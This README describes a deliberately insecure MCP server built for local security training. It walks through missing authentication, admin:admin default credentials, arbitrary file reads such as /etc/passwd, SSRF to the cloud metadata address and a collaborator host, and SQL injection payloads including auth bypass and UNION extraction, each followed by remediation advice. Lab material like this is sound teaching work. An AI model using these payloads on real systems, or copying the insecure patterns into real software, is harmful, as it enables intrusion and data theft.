Damn Vulnerable MCP Server
=======
# Vulnerable MCP Server

> **WARNING: DO NOT deploy publicly. DO NOT use in production. FOR EDUCATIONAL PURPOSES ONLY. Vibe Coded. Therefore, might have more security issues than expected.**

Vulnerable MCP Server is a deliberately insecure Python MCP server for local labs, security training, and demonstrations of common vulnerabilities in MCP servers and AI-integrated services.

It supports:

- MCP over STDIO
- MCP over Streamable HTTP at `http://localhost:8000/mcp`
- MCP over SSE when launched with `--transport sse`
- Docker and Docker Compose deployment

The code is intentionally beginner friendly. Each vulnerability lives in its own module under `vulnerable_mcp/tools/`.

## Quick Start (Recommended)

```bash
docker compose up --build
```

Connect an MCP client or MCP Inspector to:

```text
http://localhost:8000/mcp
```

For a local STDIO server:

```bash
python -m venv .venv
. .venv/bin/activate
pip install -r requirements.txt
python -m vulnerable_mcp.server --transport stdio
```

For local Streamable HTTP without Docker:

```bash
python -m venv .venv
. .venv/bin/activate
uvicorn vulnerable_mcp.http_app:app --host 0.0.0.0 --port 8000 --log-level debug
```

For local SSE:

```bash
python -m venv .venv
. .venv/bin/activate
python -m vulnerable_mcp.server --transport sse
```

## Tool Map

| Vulnerability | Tools | Module |
| --- | --- | --- |
| Lack of authentication | `read_notes`, `list_users`, `system_info` | `vulnerable_mcp/tools/unauth_tools.py` |
| Default credentials | `get_sensitive_logs`, `admin_panel` | `vulnerable_mcp/tools/auth_tools.py` |
| Excessive filesystem permissions | `read_file`, `write_file`, `list_directory` | `vulnerable_mcp/tools/file_tools.py` |
| SSRF / out-of-band interaction | `fetch_url`, `import_feed`, `check_webhook` | `vulnerable_mcp/tools/ssrf_tools.py` |
| SQL injection | `search_user`, `login_user`, `get_order` | `vulnerable_mcp/tools/sqli_tools.py` |

## Example MCP Requests

Initialize a Streamable HTTP session:

```bash
curl -i http://localhost:8000/mcp \
  -H 'Content-Type: application/json' \
  -H 'Mcp-Method: initialize' \
  -d '{
    "jsonrpc":"2.0",
    "id":1,
    "method":"initialize",
    "params":{
      "protocolVersion":"2025-06-18",
      "capabilities":{},
      "clientInfo":{"name":"curl-lab","version":"1.0"}
    }
  }'
```

List tools:

```bash
curl http://localhost:8000/mcp \
  -H 'Content-Type: application/json' \
  -H 'Mcp-Method: tools/list' \
  -d '{"jsonrpc":"2.0","id":2,"method":"tools/list","params":{}}'
```

Call an unauthenticated tool:

```bash
curl http://localhost:8000/mcp \
  -H 'Content-Type: application/json' \
  -H 'Mcp-Method: tools/call' \
  -H 'Mcp-Name: system_info' \
  -d '{"jsonrpc":"2.0","id":3,"method":"tools/call","params":{"name":"system_info","arguments":{}}}'
```

## Vulnerability Walkthroughs

### 1. Lack of Authentication

Tools: `read_notes`, `list_users`, `system_info`

These tools expose mock internal notes, user records, and runtime details without any authentication.

Example:

```json
{
  "name": "list_users",
  "arguments": {}
}
```

Expected behavior: the server returns user records to any caller.

Remediation: require authentication, authorize each tool by user/role, minimize sensitive fields, and do not expose administrative tools on public MCP endpoints.

### 2. Default Credentials

Tools: `get_sensitive_logs`, `admin_panel`

The Docker HTTP wrapper protects these MCP tools with HTTP Basic Authentication, but the credentials are intentionally hardcoded:

```text
admin:admin
```

Unauthenticated request:

```bash
curl -i http://localhost:8000/mcp \
  -H 'Content-Type: application/json' \
  -H 'Mcp-Method: tools/call' \
  -H 'Mcp-Name: get_sensitive_logs' \
  -d '{"jsonrpc":"2.0","id":4,"method":"tools/call","params":{"name":"get_sensitive_logs","arguments":{}}}'
```

Default credential request:

```bash
curl http://localhost:8000/mcp \
  -u admin:admin \
  -H 'Content-Type: application/json' \
  -H 'Mcp-Method: tools/call' \
  -H 'Mcp-Name: get_sensitive_logs' \
  -d '{"jsonrpc":"2.0","id":5,"method":"tools/call","params":{"name":"get_sensitive_logs","arguments":{}}}'
```

Expected behavior: `admin:admin` returns mock secrets and admin logs.

Remediation: never ship default credentials, use a real identity provider or MCP OAuth/resource-server authentication, rotate secrets, and perform per-tool authorization.

### 3. Excessive Filesystem Permissions

Tools: `read_file`, `write_file`, `list_directory`

The container intentionally runs as root with writable mounts:

- `/lab-data`
- `/app/secrets`
- `/data`

Read `/etc/passwd`:

```json
{
  "name": "read_file",
  "arguments": {"path": "/etc/passwd"}
}
```

List mock secrets:

```json
{
  "name": "list_directory",
  "arguments": {"path": "/app/secrets"}
}
```

Write into a mounted lab directory:

```json
{
  "name": "write_file",
  "arguments": {
    "path": "/lab-data/owned.txt",
    "content": "written through an overprivileged MCP tool"
  }
}
```

Expected behavior: arbitrary reads, listings, and writes are attempted with container root privileges.

Remediation: remove arbitrary file tools, use allowlisted directories, canonicalize paths, block traversal, run as a non-root user, use read-only filesystems, and mount only required paths.

### 4. SSRF / Out-of-Band Interaction

Tools: `fetch_url`, `import_feed`, `check_webhook`

These tools fetch arbitrary caller-supplied URLs, follow redirects, and do not block internal or link-local addresses.

Examples:

```json
{
  "name": "fetch_url",
  "arguments": {"url": "http://127.0.0.1:8000/mcp"}
}
```

```json
{
  "name": "check_webhook",
  "arguments": {"webhook_url": "https://your-collaborator.example/ping"}
}
```

```json
{
  "name": "fetch_url",
  "arguments": {"url": "http://169.254.169.254/latest/meta-data/"}
}
```

Expected behavior: the server makes outbound requests from inside the container and returns a response preview or error.

Remediation: validate schemes and hosts, block private/link-local/internal ranges, disable or limit redirects, use egress controls, and log/alert on unexpected outbound traffic.

### 5. SQL Injection

Tools: `search_user`, `login_user`, `get_order`

The SQLite database is seeded at `/data/vulnerable_mcp.sqlite` with users, passwords, admin records, API keys, and orders. Queries intentionally concatenate user input directly into SQL.

Authentication bypass:

```json
{
  "name": "login_user",
  "arguments": {
    "username": "admin' --",
    "password": "anything"
  }
}
```

Dump all users:

```json
{
  "name": "search_user",
  "arguments": {
    "username": "' OR '1'='1"
  }
}
```

UNION-style extraction from `admin_records`:

```json
{
  "name": "get_order",
  "arguments": {
    "order_id": "1 UNION SELECT id, record_type, secret_value, 0, 'from admin_records' FROM admin_records"
  }
}
```

Expected behavior: injected SQL changes the query and may return records outside the intended table.

Remediation: use parameterized queries, typed input validation, password hashing, least-privilege database accounts, and query logging that does not expose secrets.

## Logging

Verbose logging is enabled by default:

- incoming tool execution
- Basic Auth checks
- outbound SSRF URLs
- executed SQL queries
- filesystem access attempts

View Docker logs:

```bash
docker compose logs -f
```

## Project Layout

```text
.
├── Dockerfile
├── docker-compose.yml
├── lab-data/
├── secrets/
├── vulnerable_mcp/
│   ├── auth.py
│   ├── database.py
│   ├── http_app.py
│   ├── server.py
│   └── tools/
│       ├── auth_tools.py
│       ├── file_tools.py
│       ├── ssrf_tools.py
│       ├── sqli_tools.py
│       └── unauth_tools.py
└── README.md
```

## Safety Notes

This project is intentionally unsafe:

- it exposes sensitive mock data
- it accepts default credentials
- it reads and writes arbitrary paths
- it performs arbitrary outbound requests
- it builds SQL queries with string concatenation
- the Docker container runs as root

Use it only in isolated labs, local testing, and security education environments.

